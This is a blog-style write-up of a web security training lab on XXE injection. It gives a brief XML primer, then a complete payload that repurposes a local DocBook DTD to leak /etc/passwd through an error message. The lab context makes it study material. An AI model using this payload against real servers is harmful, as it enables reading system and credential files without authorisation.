# Exploiting XXE to retrieve data by repurposing a local DTD



<figure><img src="https://cdn-images-1.medium.com/max/1120/0*Dl56HCmhV-aAf8RA.jpg" alt=""><figcaption></figcaption></figure>

Hello My Friend,

I wanted to share How I solved this lab for the Sake Of Spreading Knowledge

First, let’s talk a little about what XML is.

**XML**, akin to **HTML** and **SGML**, is a widely used markup language crafted for versatile data and document transfer and storage across different applications. Unlike **HTML**, which focuses on data display, **XML** prioritizes data storage and structure representation. **XML** documents consist of element trees, each identified by a tag. The initial element is termed the **root** element, while subsequent elements are called **child** elements.

<figure><img src="https://cdn-images-1.medium.com/max/1120/0*8dAfVwsl4Y42l4yV" alt=""><figcaption></figcaption></figure>

Example of an XML Document representing and user structure:

```
<?xml version="1.0"?>
<users>
    <user>
       <!-- child elements here -->
        <username>admin</username>
        <password>secrte</password>
        <group>Administrator</group>
    </user>
     <user>
        <username>h3ckt00r</username>
        <password>secrtehacktor</password>
        <group>users</group>
    </user>
<users>
```

The above example shows some of the key elements of an XML document, like:

<figure><img src="https://cdn-images-1.medium.com/max/1120/1*JJ4e8Ps3IUC8SbnuEuWOkQ.png" alt=""><figcaption></figcaption></figure>

Now that we understand it, let’s go into the solution.

Let’s go to the website and search for a bit. You will find a parameter called check stock. Click and let’s go to Burpsuite.

<figure><img src="https://cdn-images-1.medium.com/max/1120/1*FU_RM9ohwTajpSsmoOFBiA.png" alt=""><figcaption><p>check Stock button</p></figcaption></figure>

<figure><img src="https://cdn-images-1.medium.com/max/1120/1*c4i0PKyOwTe8sVLCh00Zjg.png" alt=""><figcaption><p>Hint</p></figcaption></figure>

> Now I will go call **docbookx.dtd** and from within I will take the entity called **ISOanso** and I will go and create another entity and make a call to **/etc/passwd** and after that I will create another **entity** and look in it for any **error** that appears and after that I will call Reference of the **first entity**. Come on, let’s see the failure. It will make you understand, my friend.

```
<!DOCTYPE h3ckt00r [ 
<!ENTITY % read SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY  &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY  &#x25; eval  "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%read;
]>
```

<figure><img src="https://cdn-images-1.medium.com/max/1120/1*a1raYBrmbt52zOiTFdyWkg.png" alt=""><figcaption><p>B000000M!</p></figcaption></figure>

<figure><img src="https://cdn-images-1.medium.com/max/1120/0*qpQA_Wu0Lq_iZneH.jpeg" alt=""><figcaption></figcaption></figure>

Thanks for reading, Hope you guys liked it.

\
